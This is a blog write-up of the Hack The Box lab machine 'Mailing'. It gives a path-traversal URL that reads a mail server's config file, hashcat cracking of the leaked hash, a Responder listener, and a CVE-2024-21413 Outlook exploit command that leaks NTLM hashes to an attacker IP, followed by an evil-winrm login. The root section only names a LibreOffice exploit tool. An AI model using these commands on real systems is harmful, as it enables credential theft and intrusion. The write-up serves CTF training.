---
title: 'HTB Mailing Writeup'
date: 2024-05-15
permalink: /posts/2012/08/HTB-Mailing-Writeup/
tags:
  - HTB
  - writeup
  - easy
---

A writeup of the Hack The Box machine "Mailing" with easy difficulty

<img src='/images/HTB_Mailing/Screenshot 2024-05-29 230041.png'>

**Welcome to this writeup of the HTB seasonal machine called Mailing. It is a Windows machine with easy difficulty.**

Enumeration
======
First, run a Nmap scan which gives the following results: 

<img src='/images/HTB_Mailing/Screenshot 2024-05-29 230522.png'>

We can see a webpage called mailing.htb so we put this in the /etc/hosts file with the IP of the machine: 10.10.11.14. 

This shows us the webpage > 

<img src='/images/HTB_Mailing/Screenshot 2024-05-29 230635.png'>

Next, we run a dirsearch scan to enumerate directories > 

<img src='/images/HTB_Mailing/Screenshot 2024-05-29 230719.png'>

Hmm alright. There is an /assets page and a /download.php page. 

The /assets page only shows us beautiful pictures of nature 😊 and the download page says “No file specified for download”.

<img src='/images/HTB_Mailing/Screenshot 2024-05-29 230838.png'>

After that someone requested a machine reset lol. 

<img src='/images/HTB_Mailing/Screenshot 2024-05-29 230917.png'>

Allright, so I think LFI (Local File Inclusion) is a possible entry point with this /download.php page.  

User flag
======
After some more enumeration, I could download a hMailServer.INI file via the following URL: "http://mailing.htb/download.php?file=../../../Program+Files+(x86)/hMailServer/Bin/hMailServer.INI"

This file contains the administrator password of something > 

<img src='/images/HTB_Mailing/Screenshot 2024-05-29 231035.png'>

These are hashed passwords we have to crack with hashcat > `hashcat --force -m 0 -a 0 pass.txt /usr/share/wordlists/rockyou.txt` --where –m 0 stands for a md5 hash. 

<img src='/images/HTB_Mailing/Screenshot 2024-05-29 231222.png'>

This password is for telnet access. Port 110 is the pop3 mailserver.  

With the command `telnet 10.10.11.14 110` we can connect to the mailserver. 

<img src='/images/HTB_Mailing/Screenshot 2024-05-29 231313.png'>

There are no messages sadly. But the username and password are correct. 

With the "https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability" exploit a user and a password can be obtained. 

Setup a responder listerner with: `sudo responder -I tun0 -v`

Then we run the following command > `python3 CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password <The-password-we-obtained> --sender administrator@mailing.htb --recipient maya@mailing.htb --url "\\IP/blabla" --subject Hello`

This will give you a hash which is a password we can crack with hashcat. 

A Evil winrm can be established with: `evil-winrm -i 10.10.11.14 -u maya -p <Cracked-password>`

The user flag can be found in the Desktop directory > 

<img src='/images/HTB_Mailing/Screenshot 2024-05-29 231754.png'>

Root flag
======
After searching the directories on the machine, we discovered that Libreoffice is running an outdated version. After searching for an exploit, we can use this tool: "https://github.com/elweth-sec/CVE-2023-2255" to probably gain root. 

